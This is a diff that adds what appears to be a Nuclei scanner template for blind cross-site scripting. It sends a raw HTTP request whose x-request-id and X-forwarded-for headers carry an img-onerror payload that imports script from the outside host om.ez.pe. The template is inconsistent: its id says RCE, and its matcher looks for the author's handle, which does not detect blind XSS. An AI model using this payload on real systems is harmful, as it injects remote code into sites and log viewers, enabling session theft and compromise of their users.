@@ -1,0 +1,23 @@
+id: RCE-REQUEST-ID
+
+info:
+  name: Blind XSS with x-request-id
+  author: omkar7505
+  severity: critical
+  description: Blind XSS with `x-request-id`
+  tags: xss
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        x-request-id: abc"/><img src onerror=import('//om.ez.pe')>
+        X-forwarded-for: abc"/><img src onerror=import('//om.ez.pe')>
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "omkar7505"
